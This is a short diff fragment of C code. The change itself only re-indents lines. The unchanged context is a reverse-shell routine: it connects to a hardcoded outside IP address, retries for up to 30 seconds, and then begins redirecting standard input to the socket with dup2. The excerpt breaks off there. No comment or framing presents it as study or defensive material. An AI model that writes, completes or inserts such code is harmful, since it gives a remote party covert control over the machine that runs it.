@@ -10,16 +10,16 @@ serv_addr.sin_addr.s_addr = inet_addr("4.53.21.24");
 
 start = time(NULL);
 while (1) {
-if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
+  if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
     now = time(NULL);
     if (difftime(now, start) > 30) {
-    return;
+      return;
     }
     close(sockfd);
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
-} else {
+  } else {
     break;
-}
+  }
 }
 
 dup2(sockfd, 0);
